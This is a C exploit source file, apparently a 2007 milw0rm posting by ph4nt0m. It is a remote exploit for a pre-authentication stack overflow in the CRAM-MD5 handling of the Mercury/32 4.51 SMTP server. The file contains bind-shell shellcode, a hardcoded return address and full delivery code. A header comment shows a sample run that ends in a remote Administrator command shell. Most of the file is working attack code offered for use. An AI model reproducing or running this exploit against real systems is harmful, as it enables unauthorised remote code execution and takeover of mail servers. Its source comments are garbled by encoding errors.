/*
	Mercury/32 4.51 SMTPD CRAM-MD5 Pre-Auth Remote Stack Overflow(Universal)
	Public Version 1.0
	http://www.ph4nt0m.org   
	2007-08-22
	
	Code by: Zhenhan.Liu
	Original POC: http://www.milw0rm.com/exploits/4294
	
	Vuln Analysis: http://pstgroup.blogspot.com/2007/08/tipsmercury-smtpd-auth-cram-md5-pre.html
	
	Our Mail-list: http://list.ph4nt0m.org  (Chinese)

  It will bind a cmdshell on port 1154 if successful.

Z:\\Exp\\Mercury SMTPD>mercury_smtpd.exe 127.0.0.1 25
== Mercury/32 4.51 SMTPD CRAM-MD5 Pre-Auth Remote Stack Overflow
== Public Version 1.0
== http://www.ph4nt0m.org   2007-08-22

[*] connect to 127.0.0.1:25 ... OK!
[C] EHLO void#ph4nt0m.org
[S] 220 root ESMTP server ready.
[S] 250-root Hello void#ph4nt0m.org; ESMTPs are:
250-TIME
[S] 250-SIZE 0
[S] 250 HELP
[C] AUTH CRAM-MD5
[S] 334 PDM0OTg4MjguMzQ2QHJvb3Q+
[C] Send Payload...
[-] Done! cmdshell@1154?

Z:\\Exp\\Mercury SMTPD\\Mercury SMTPD>nc -vv 127.0.0.1 1154
DNS fwd/rev mismatch: localhost != gnu
localhost [127.0.0.1] 1154 (?) open
Microsoft Windows XP [Â°Ã¦Â±Â¾ 5.1.2600]
(C) Â°Ã¦ÃˆÂ¨Ã‹Ã¹Ã“Ã 1985-2001 Microsoft Corp.

e:\\MERCURY>whoami
whoami
Administrator
  

*/

#include <io.h>
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, \"ws2_32\")


/* win32_bind -  EXITFUNC=thread LPORT=1154 Size=317 Encoder=None http://metasploit.com */
unsigned char shellcode[] =
\"\\xfc\\x6a\\xeb\\x4d\\xe8\\xf9\\xff\\xff\\xff\\x60\\x8b\\x6c\\x24\\x24\\x8b\\x45\"
\"\\x3c\\x8b\\x7c\\x05\\x78\\x01\\xef\\x8b\\x4f\\x18\\x8b\\x5f\\x20\\x01\\xeb\\x49\"
\"\\x8b\\x34\\x8b\\x01\\xee\\x31\\xc0\\x99\\xac\\x84\\xc0\\x74\\x07\\xc1\\xca\\x0d\"
\"\\x01\\xc2\\xeb\\xf4\\x3b\\x54\\x24\\x28\\x75\\xe5\\x8b\\x5f\\x24\\x01\\xeb\\x66\"
\"\\x8b\\x0c\\x4b\\x8b\\x5f\\x1c\\x01\\xeb\\x03\\x2c\\x8b\\x89\\x6c\\x24\\x1c\\x61\"
\"\\xc3\\x31\\xdb\\x64\\x8b\\x43\\x30\\x8b\\x40\\x0c\\x8b\\x70\\x1c\\xad\\x8b\\x40\"
\"\\x08\\x5e\\x68\\x8e\\x4e\\x0e\\xec\\x50\\xff\\xd6\\x66\\x53\\x66\\x68\\x33\\x32\"
\"\\x68\\x77\\x73\\x32\\x5f\\x54\\xff\\xd0\\x68\\xcb\\xed\\xfc\\x3b\\x50\\xff\\xd6\"
\"\\x5f\\x89\\xe5\\x66\\x81\\xed\\x08\\x02\\x55\\x6a\\x02\\xff\\xd0\\x68\\xd9\\x09\"
\"\\xf5\\xad\\x57\\xff\\xd6\\x53\\x53\\x53\\x53\\x53\\x43\\x53\\x43\\x53\\xff\\xd0\"
\"\\x66\\x68\\x04\\x82\\x66\\x53\\x89\\xe1\\x95\\x68\\xa4\\x1a\\x70\\xc7\\x57\\xff\"
\"\\xd6\\x6a\\x10\\x51\\x55\\xff\\xd0\\x68\\xa4\\xad\\x2e\\xe9\\x57\\xff\\xd6\\x53\"
\"\\x55\\xff\\xd0\\x68\\xe5\\x49\\x86\\x49\\x57\\xff\\xd6\\x50\\x54\\x54\\x55\\xff\"
\"\\xd0\\x93\\x68\\xe7\\x79\\xc6\\x79\\x57\\xff\\xd6\\x55\\xff\\xd0\\x66\\x6a\\x64\"
\"\\x66\\x68\\x63\\x6d\\x89\\xe5\\x6a\\x50\\x59\\x29\\xcc\\x89\\xe7\\x6a\\x44\\x89\"
\"\\xe2\\x31\\xc0\\xf3\\xaa\\xfe\\x42\\x2d\\xfe\\x42\\x2c\\x93\\x8d\\x7a\\x38\\xab\"
\"\\xab\\xab\\x68\\x72\\xfe\\xb3\\x16\\xff\\x75\\x44\\xff\\xd6\\x5b\\x57\\x52\\x51\"
\"\\x51\\x51\\x6a\\x01\\x51\\x51\\x55\\x51\\xff\\xd0\\x68\\xad\\xd9\\x05\\xce\\x53\"
\"\\xff\\xd6\\x6a\\xff\\xff\\x37\\xff\\xd0\\x8b\\x57\\xfc\\x83\\xc4\\x64\\xff\\xd6\"
\"\\x52\\xff\\xd0\\x68\\xef\\xce\\xe0\\x60\\x53\\xff\\xd6\\xff\\xd0\";



// Base64Ã—Ã–Â·Ã»Â¼Â¯
__inline char GetB64Char(int index)
{
    const char szBase64Table[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";
    if (index >= 0 && index < 64)
	return szBase64Table[index];
    
    return \'=\';
}


// Â´Ã“Ã‹Â«Ã—Ã–Ã–ÃÃˆÂ¡ÂµÂ¥Ã—Ã–Â½Ãš
#define B0(a) (a & 0xFF)
#define B1(a) (a >> 8 & 0xFF)
#define B2(a) (a >> 16 & 0xFF)
#define B3(a) (a >> 24 & 0xFF)


// Â±Ã Ã‚Ã«ÂºÃ³ÂµÃ„Â³Â¤Â¶ÃˆÃ’Â»Â°Ã£Â±ÃˆÃ”Â­ÃŽÃ„Â¶Ã Ã•Â¼1/3ÂµÃ„Â´Ã¦Â´Â¢Â¿Ã•Â¼Ã¤Â£Â¬Ã‡Ã«Â±Â£Ã–Â¤base64codeÃ“ÃÃ—Ã£Â¹Â»ÂµÃ„Â¿Ã•Â¼Ã¤
inline int Base64Encode(char * base64code, const char * src, int src_len) 
{   
    if (src_len == 0)
	src_len = strlen(src);
    
    int len = 0;
    unsigned char* psrc = (unsigned char*)src;
    char * p64 = base64code;
    for (int i = 0; i < src_len - 3; i += 3)
    {
	unsigned long ulTmp = *(unsigned long*)psrc;
	register int b0 = GetB64Char((B0(ulTmp) >> 2) & 0x3F); 
	register int b1 = GetB64Char((B0(ulTmp) << 6 >> 2 | B1(ulTmp) >> 4) & 0x3F); 
	register int b2 = GetB64Char((B1(ulTmp) << 4 >> 2 | B2(ulTmp) >> 6) & 0x3F); 
	register int b3 = GetB64Char((B2(ulTmp) << 2 >> 2) & 0x3F); 
	*((unsigned long*)p64) = b0 | b1 << 8 | b2 << 16 | b3 << 24;
	len += 4;

	p64  += 4;

	psrc += 3;
    }
    
    // Â´Â¦Ã€Ã­Ã—Ã®ÂºÃ³Ã“Ã ÃÃ‚ÂµÃ„Â²Â»Ã—Ã£3Ã—Ã–Â½ÃšÂµÃ„Â¶Ã¶ÃŠÃ½Â¾Ã
    if (i < src_len)
    {
	int rest = src_len - i;
	unsigned long ulTmp = 0;
	for (int j = 0; j < rest; ++j)
	{
	    *(((unsigned char*)&ulTmp) + j) = *psrc++;
	}
	
	p64[0] = GetB64Char((B0(ulTmp) >> 2) & 0x3F); 
	p64[1] = GetB64Char((B0(ulTmp) << 6 >> 2 | B1(ulTmp) >> 4) & 0x3F); 
	p64[2] = rest > 1 ? GetB64Char((B1(ulTmp) << 4 >> 2 | B2(ulTmp) >> 6) & 0x3F) : \'=\'; 
	p64[3] = rest > 2 ? GetB64Char((B2(ulTmp) << 2 >> 2) & 0x3F) : \'=\'; 
	p64 += 4; 
	len += 4;
    }
    
    *p64 = \'\\0\'; 
    
    return len;
}


char* GetErrorMessage(DWORD dwMessageId)
{
    static  char ErrorMessage[1024];
    DWORD	 dwRet;

    dwRet = FormatMessage(
							FORMAT_MESSAGE_FROM_SYSTEM, // source and processing options 
							NULL,			    // pointer to  message source 
							dwMessageId,		    // requested message identifier 
							0,			    //dwLanguageId
							ErrorMessage,		    //lpBuffer
							1024,			    //nSize	
							NULL			    //Arguments
							);

    if(dwRet)
		return ErrorMessage;
    else
    {
		sprintf(ErrorMessage, \"ID:%d(%08.8X)\", dwMessageId, dwMessageId);
		return ErrorMessage;
    }

}


int MakeConnection(char *address,int port,int timeout)
{
    struct sockaddr_in target;
    SOCKET s;
    int i;
    DWORD bf;
    fd_set wd;
    struct timeval tv;

    s = socket(AF_INET,SOCK_STREAM,0);
    if(s<0)
        return -1;

    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(address);
    if(target.sin_addr.s_addr==0)
    {
        closesocket(s);
        return -2;
    }
    target.sin_port = htons((short)port);
    bf = 1;
    ioctlsocket(s,FIONBIO,&bf);
    tv.tv_sec = timeout;
    tv.tv_usec = 0;
    FD_ZERO(&wd);
    FD_SET(s,&wd);
    connect(s,(struct sockaddr *)&target,sizeof(target));
    if((i=select(s+1,0,&wd,0,&tv))==(-1))
    {
        closesocket(s);
        return -3;
    }
    if(i==0)
    {
        closesocket(s);
        return -4;
    }
    i = sizeof(int);
    getsockopt(s,SOL_SOCKET,SO_ERROR,(char *)&bf,&i);
    if((bf!=0)||(i!=sizeof(int)))
    {
        closesocket(s);
        return -5;
    }
    ioctlsocket(s,FIONBIO,&bf);
    return s;
}


int check_recv(SOCKET s, char* str_sig)
{
	char buf[1024];
	int  ret;

	for(;;)
	{
		memset(buf, 0, sizeof(buf));
		ret = recv(s, buf, sizeof(buf), 0);
		if(ret > 0)
		{
			printf(\"[S] %s\", buf);
		}
		else
		{
			printf(\"[-] recv() %s\\n\",  GetErrorMessage(GetLastError()));
			closesocket(s);
			ExitProcess(-1);
		}

		if(strstr(buf, str_sig))
		{
			break;
		}
		else
		{
			continue;
		}
	} //for(;;)

	return ret;
}


int check_send(SOCKET s, char* buf, unsigned int buf_len)
{
	int ret;
	
	ret = send(s, buf, buf_len, 0);
	if( ret >0)
	{
		return ret;
	}
	else
	{
		printf(\"[-] send() %s\\n\", GetErrorMessage(GetLastError()));
		closesocket(s);
		ExitProcess(-1);
	}
}


void exploit_mercury_smtpd(char* ip, unsigned short port)
{
	SOCKET s;
	WSADATA wsa;
	char buf[1500];
	char payload[sizeof(buf)*4/3+16];
	int base64_len;


	memset(buf, 0x90, sizeof(buf));
	memcpy(&buf[1244-sizeof(shellcode)-32], shellcode, sizeof(shellcode));
	memcpy(&buf[1244], \"\\x90\\x90\\xeb\\x06\", 4);
	memcpy(&buf[1244+4], \"\\x2d\\x12\\x40\\x00\", 4);  //universal opcode in mercury.exe. no safeseh
	memcpy(&buf[1244+4+4], \"\\x90\\x90\\x90\\x90\\xE9\\x44\\xfd\\xff\\xff\", 9);
	buf[sizeof(buf)-1] = \'\\0\'; 

	memset(payload, 0x00, sizeof(payload));
	base64_len = Base64Encode(payload, buf, sizeof(buf));
	memcpy(&payload[base64_len], \"\\r\\n\", 3);

	printf(\"[*] connect to %s:%d ... \", ip, port);
	WSAStartup(MAKEWORD(2,2), &wsa);
	s = MakeConnection(ip, port, 10);
	if(s <= 0)
	{
		printf(\"Failed! %s\\n\",  GetErrorMessage(GetLastError()) );
		return;
	}
	else
	{
		printf(\"OK!\\n\");
	}

	_snprintf(buf, sizeof(buf), \"EHLO void#ph4nt0m.org\\r\\n\");
	printf(\"[C] %s\", buf);
	check_send(s, buf, strlen(buf));
	check_recv(s, \"250 HELP\");
		
	_snprintf(buf, sizeof(buf), \"AUTH CRAM-MD5\\r\\n\");
	printf(\"[C] %s\", buf);
	check_send(s, buf, strlen(buf));
	check_recv(s, \"334\");

	printf(\"[C] Send Payload...\\n\");
	check_send(s, payload, strlen(payload));
	printf(\"[-] Done! cmdshell@1154?\\n\");
	
	closesocket(s);
	WSACleanup();
	
}

void main(int argc, char* argv[])
{
	printf(\"== Mercury/32 4.51 SMTPD CRAM-MD5 Pre-Auth Remote Stack Overflow\\n\");
	printf(\"== Public Version 1.0\\n\");
	printf(\"== http://www.ph4nt0m.org   2007-08-22\\n\");
	printf(\"== code by Zhenhan.Liu\\n\\n\");
	
	
	if(argc==3)
		exploit_mercury_smtpd(argv[1], atoi(argv[2]));
	else
	{
		printf(	\"Usage:\\n\"
				\"  %s <ip> <port> \\n\", argv[0]);
	}
}

// milw0rm.com [2007-08-22]
